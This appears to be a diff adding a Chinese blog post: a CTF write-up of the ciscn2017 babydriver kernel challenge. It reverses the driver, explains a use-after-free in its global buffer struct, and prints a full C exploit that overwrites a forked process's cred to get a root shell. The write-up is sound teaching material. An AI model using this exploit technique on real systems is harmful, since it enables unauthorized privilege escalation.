@@ -82,6 +82,291 @@
 
       <div class="outer">
         <section id="main">
+  <article id="post-ciscn2017-babydriver" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/CTF/PWN/kernel-pwn/wp/ciscn2017-babydriver/">ciscn2017_babydriver</a>
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2021-11-13T00:34:17.000Z" itemprop="datePublished">2021年11月13日</time>
+</span>
+      
+  <div class="article-category">
+    <i class="fa fa-classify"></i>
+    <a class="article-category-link" href="/categories/CTF/">CTF</a> > <a class="article-category-link" href="/categories/CTF/PWN/">PWN</a> > <a class="article-category-link" href="/categories/CTF/PWN/kernel-pwn/">kernel pwn</a> > <a class="article-category-link" href="/categories/CTF/PWN/kernel-pwn/wp/">wp</a>
+  </div>
+
+      
+      
+<a href="/CTF/PWN/kernel-pwn/wp/ciscn2017-babydriver/#comments" class="article-comment-link">
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="ciscn2017-babydriver"><a href="#ciscn2017-babydriver" class="headerlink" title="ciscn2017_babydriver"></a>ciscn2017_babydriver</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>下载源文件；</p>
+<p>检查bzImage；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ file bzImage </span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA</span><br><span class="line">$ strings bzImage | grep &quot;gcc&quot;</span><br><span class="line">4.4.72 (atum@ubuntu) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #1 SMP Thu Jun 15 19:52:50 PDT 2017</span><br></pre></td></tr></table></figure>
+
+<p>下载对应内核版本并编译；</p>
+<p>解包文件系统映像；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">unzipcpio</span><br><span class="line"></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>
+
+<h3 id="IDA-pro"><a href="#IDA-pro" class="headerlink" title="IDA pro"></a>IDA pro</h3><p>把解压后得到的文件lib/modules/4.4.72/babydriver.ko放到ida64中分析；</p>
+<p>没有去除符号表，使用<code>shift+F9</code>来查看结构体，可以得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00000000 babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)</span><br><span class="line">00000000                                         ; XREF: .bss:babydev_struct/r</span><br><span class="line">00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r</span><br><span class="line">00000000                                         ; babyopen+26/w ... ; offset</span><br><span class="line">00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w</span><br><span class="line">00000008                                         ; babyioctl+3C/w ...</span><br><span class="line">00000010 babydevice_t    ends</span><br><span class="line">00000010</span><br></pre></td></tr></table></figure>
+
+<p>查看主要函数；</p>
+<h4 id="babyioctl"><a href="#babyioctl" class="headerlink" title="babyioctl"></a>babyioctl</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command, arg);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )                     <span class="comment">// 定义命令0x10001,</span></span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);           <span class="comment">// 释放结构体中的device_buf</span></span><br><span class="line">    babydev_struct.device_buf = (<span class="keyword">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);<span class="comment">// 根据传递的size重新申请内存，设置为device_buf_len</span></span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB, v3);</span><br><span class="line">    result = <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="babyopen"><a href="#babyopen" class="headerlink" title="babyopen"></a>babyopen</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">    <span class="comment">// 申请0x40大小的空间，存储在全局变量babydev_struct.device_buf上</span></span><br><span class="line">  babydev_struct.device_buf = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">0x40</span>LL);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">0x40</span>LL;       <span class="comment">// 更新babydev_struct.device_buf_len</span></span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">0x24000C0</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="babyread"><a href="#babyread" class="headerlink" title="babyread"></a>babyread</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )             <span class="comment">// buffer和size都是用户传递的参数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )     <span class="comment">// 检查长度是否小于device_buf_len</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);                       <span class="comment">// 将device_buf中的数据拷贝到buffer中</span></span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="babywrite"><a href="#babywrite" class="headerlink" title="babywrite"></a>babywrite</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )     <span class="comment">// 检查长度</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();                           <span class="comment">// 将buffer拷贝到全局变量中</span></span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="babyrelease"><a href="#babyrelease" class="headerlink" title="babyrelease"></a>babyrelease</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);            <span class="comment">// 释放空间</span></span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>babydriver_init()完成对/dev/babydev设备的初始化；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">babydriver_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v3</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0LL</span>, <span class="number">1LL</span>, <span class="string">&quot;babydev&quot;</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">    v1 = babydev_no;</span><br><span class="line">    cdev_0.owner = &amp;_this_module;</span><br><span class="line">    v2 = cdev_add(&amp;cdev_0, babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = (class *)_class_create(&amp;_this_module, <span class="string">&quot;babydev&quot;</span>, &amp;babydev_no);</span><br><span class="line">      babydev_class = v3;</span><br><span class="line">      <span class="keyword">if</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = device_create(v3, <span class="number">0LL</span>, babydev_no, <span class="number">0LL</span>, <span class="string">&quot;babydev&quot;</span>);</span><br><span class="line">        v0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v4 )</span><br><span class="line">          <span class="keyword">return</span> v0;</span><br><span class="line">        printk(&amp;unk_351, <span class="number">0LL</span>);</span><br><span class="line">        class_destroy(babydev_class);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_33B, <span class="string">&quot;babydev&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      cdev_del(&amp;cdev_0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_327, v1);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(&amp;unk_309, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>babydriver_exit() 完成对 /dev/babydev 设备的清理</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">babydriver_exit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  device_destroy(babydev_class, babydev_no);</span><br><span class="line">  class_destroy(babydev_class);</span><br><span class="line">  cdev_del(&amp;cdev_0);</span><br><span class="line">  unregister_chrdev_region(babydev_no, <span class="number">1LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>没有有用户态的溢出漏洞，但是注意到babydev_stuct是一个全局的结构体，因此就存在一个伪条件竞争的UAF漏洞；</p>
+<p>这也就意味着，如果同时打开两个设备，第二个设备写入的数据将会覆盖第一个设备的空间；同样，如果释放第二个，那么第一个设备也会被释放；</p>
+<p>利用uaf漏洞来修改cred结构体中的权限；</p>
+<ol>
+<li>连续开启两个设备，通过ioctl修改大小为cred结构体大小；</li>
+<li>释放其中一个设备，fork一个新进程，使这个进程的cred空间和之前释放的空间重叠；</li>
+<li>通过另一个文件描述符对该空间进行写操作，将uid，gid改为0，实现提权到root；</li>
+</ol>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h4 id="两次打开设备"><a href="#两次打开设备" class="headerlink" title="两次打开设备"></a>两次打开设备</h4><p>为后续uaf做准备；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string">int fd2 = open(&quot;</span>/dev/babydev<span class="string">&quot;, 2&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="找到内核版本对应的cred"><a href="#找到内核版本对应的cred" class="headerlink" title="找到内核版本对应的cred"></a>找到内核版本对应的cred</h4><p>在内核源码目录中的linux-4.4.72/include/linux/cred.h；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">  <span class="keyword">atomic_t</span>  usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">  <span class="keyword">atomic_t</span>  subscribers;  <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">  <span class="keyword">void</span>    *put_addr;</span><br><span class="line">  <span class="keyword">unsigned</span>  magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD  0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">kuid_t</span>    uid;    <span class="comment">/* real UID of the task */</span></span><br><span class="line">  <span class="keyword">kgid_t</span>    gid;    <span class="comment">/* real GID of the task */</span></span><br><span class="line">  <span class="keyword">kuid_t</span>    suid;    <span class="comment">/* saved UID of the task */</span></span><br><span class="line">  <span class="keyword">kgid_t</span>    sgid;    <span class="comment">/* saved GID of the task */</span></span><br><span class="line">  <span class="keyword">kuid_t</span>    euid;    <span class="comment">/* effective UID of the task */</span></span><br><span class="line">  <span class="keyword">kgid_t</span>    egid;    <span class="comment">/* effective GID of the task */</span></span><br><span class="line">  <span class="keyword">kuid_t</span>    fsuid;    <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">  <span class="keyword">kgid_t</span>    fsgid;    <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">  <span class="keyword">unsigned</span>  securebits;  <span class="comment">/* SUID-less security management */</span></span><br><span class="line">  <span class="keyword">kernel_cap_t</span>  cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">  <span class="keyword">kernel_cap_t</span>  cap_permitted;  <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">  <span class="keyword">kernel_cap_t</span>  cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">  <span class="keyword">kernel_cap_t</span>  cap_bset;  <span class="comment">/* capability bounding set */</span></span><br><span class="line">  <span class="keyword">kernel_cap_t</span>  cap_ambient;  <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>  jit_keyring;  <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">           * keys to */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">  <span class="keyword">void</span>    *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>  <span class="comment">/* real user ID subscription */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>  <span class="title">rcu</span>;</span>    <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>写exp</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*************************************************************************</span></span><br><span class="line"><span class="comment">    &gt; File Name: exploit.c</span></span><br><span class="line"><span class="comment">    &gt; Author: K1ose</span></span><br><span class="line"><span class="comment">    &gt; Mail: klose@jk404.cn</span></span><br><span class="line"><span class="comment">    &gt; Created Time: Fri 05 Nov 2021 08:53:41 PM CST</span></span><br><span class="line"><span class="comment"> ************************************************************************/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 打开两次设备</span></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放 fd1</span></span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠</span></span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] fork error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0</span></span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] root now.&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用<code>gcc exploit.c -static -o exploit</code>编译exp，kernel中没有libc；</p>
+<p>将exp可执行文件放到解压后的目录core/tmp下，重新打包后，将文件系统映像放回主目录；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp exploit core/tmp</span><br><span class="line">cd core</span><br><span class="line">find . | cpio -o --format=newc &gt; rootfs.cpio</span><br><span class="line">cp rootfs.cpio ..</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>
+
+<p>sudo执行boot.sh；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./boot.sh</span><br></pre></td></tr></table></figure>
+
